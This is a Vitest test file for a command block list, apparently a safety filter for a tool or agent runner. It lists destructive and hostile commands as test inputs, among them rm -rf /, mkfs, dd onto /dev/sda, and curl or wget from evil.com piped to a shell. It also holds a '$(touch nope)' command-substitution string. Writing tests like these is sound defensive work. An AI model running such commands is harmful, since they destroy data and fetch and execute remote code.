import { describe, it, expect } from "vitest";
import { BlockedCommands, normalizeArgv } from "./blocked-commands.js";

describe("BlockedCommands", () => {
  const bc = new BlockedCommands();

  it("blocks rm -rf /", () => {
    const result = bc.isBlocked(["rm", "-rf", "/"]);
    expect(result.blocked).toBe(true);
    expect(result.reason).toContain("blocked by safety policy");
  });

  it("blocks rm -rf with flags variations", () => {
    expect(bc.isBlocked(["rm", "-rf", "/home"]).blocked).toBe(true);
    expect(bc.isBlocked(["rm", "-fr", "/home"]).blocked).toBe(true);
    expect(bc.isBlocked(["rm", "--recursive", "-f", "/"]).blocked).toBe(false);
  });

  it("blocks format C:", () => {
    expect(bc.isBlocked(["format", "C:"]).blocked).toBe(true);
    expect(bc.isBlocked(["format", "D:"]).blocked).toBe(true);
  });

  it("blocks mkfs", () => {
    expect(bc.isBlocked(["mkfs", "/dev/sda1"]).blocked).toBe(true);
    expect(bc.isBlocked(["mkfs.ext4", "/dev/sdb"]).blocked).toBe(true);
  });

  it("blocks dd to /dev/", () => {
    expect(bc.isBlocked(["dd", "if=/dev/zero", "of=/dev/sda"]).blocked).toBe(true);
  });

  it("blocks shutdown/reboot", () => {
    expect(bc.isBlocked(["shutdown", "-h", "now"]).blocked).toBe(true);
    expect(bc.isBlocked(["reboot"]).blocked).toBe(true);
    expect(bc.isBlocked(["poweroff"]).blocked).toBe(true);
  });

  it("blocks registry delete", () => {
    expect(bc.isBlocked(["reg", "delete", "HKLM\\something"]).blocked).toBe(true);
  });

  it("blocks diskpart", () => {
    expect(bc.isBlocked(["diskpart"]).blocked).toBe(true);
  });

  it("blocks git push --force", () => {
    expect(bc.isBlocked(["git", "push", "origin", "main", "--force"]).blocked).toBe(true);
    expect(bc.isBlocked(["git", "push", "-f"]).blocked).toBe(true);
  });

  it("blocks curl | sh (pipe to shell)", () => {
    expect(bc.isBlocked(["curl", "http://evil.com/script.sh", "|", "sh"]).blocked).toBe(true);
    expect(bc.isBlocked(["wget", "http://evil.com/x", "|", "bash"]).blocked).toBe(true);
  });

  it("blocks docker privileged", () => {
    expect(bc.isBlocked(["docker", "run", "--privileged", "ubuntu"]).blocked).toBe(true);
  });

  it("blocks net stop / sc delete", () => {
    expect(bc.isBlocked(["net", "stop", "wuauserv"]).blocked).toBe(true);
    expect(bc.isBlocked(["sc", "delete", "MyService"]).blocked).toBe(true);
  });

  it("blocks nmap", () => {
    expect(bc.isBlocked(["nmap", "-sV", "192.168.1.0/24"]).blocked).toBe(true);
  });

  it("blocks rmdir /s /q on Windows root", () => {
    expect(bc.isBlocked(["rmdir", "/s", "/q", "C:\\"]).blocked).toBe(true);
  });

  it("allows safe commands", () => {
    expect(bc.isBlocked(["echo", "hello"]).blocked).toBe(false);
    expect(bc.isBlocked(["npm", "test"]).blocked).toBe(false);
    expect(bc.isBlocked(["git", "status"]).blocked).toBe(false);
    expect(bc.isBlocked(["git", "push", "origin", "main"]).blocked).toBe(false);
    expect(bc.isBlocked(["ls", "-la"]).blocked).toBe(false);
    expect(bc.isBlocked(["rm", "temp.txt"]).blocked).toBe(false);
    expect(bc.isBlocked(["node", "server.js"]).blocked).toBe(false);
    expect(bc.isBlocked(["docker", "run", "ubuntu", "echo", "hi"]).blocked).toBe(false);
    expect(bc.isBlocked(["curl", "https://api.example.com"]).blocked).toBe(false);
  });

  it("supports extra patterns", () => {
    const custom = new BlockedCommands({ extraPatterns: ["\\bdanger\\b"] });
    expect(custom.isBlocked(["danger", "zone"]).blocked).toBe(true);
    expect(custom.isBlocked(["rm", "-rf", "/"]).blocked).toBe(true);
  });

  it("can disable defaults", () => {
    const noDefaults = new BlockedCommands({ disableDefaults: true });
    expect(noDefaults.isBlocked(["rm", "-rf", "/"]).blocked).toBe(false);
  });
});

describe("normalizeArgv", () => {
  it("returns command + args when args provided", () => {
    expect(normalizeArgv("node", ["server.js"])).toEqual(["node", "server.js"]);
  });

  it("keeps a single command as literal argv", () => {
    expect(normalizeArgv("echo hello")).toEqual(["echo hello"]);
  });

  it("does not interpret metacharacters", () => {
    expect(normalizeArgv("printf", ["a b", "$(touch nope)", "x|y", "(z)", "\"q\""]))
      .toEqual(["printf", "a b", "$(touch nope)", "x|y", "(z)", "\"q\""]);
  });
});
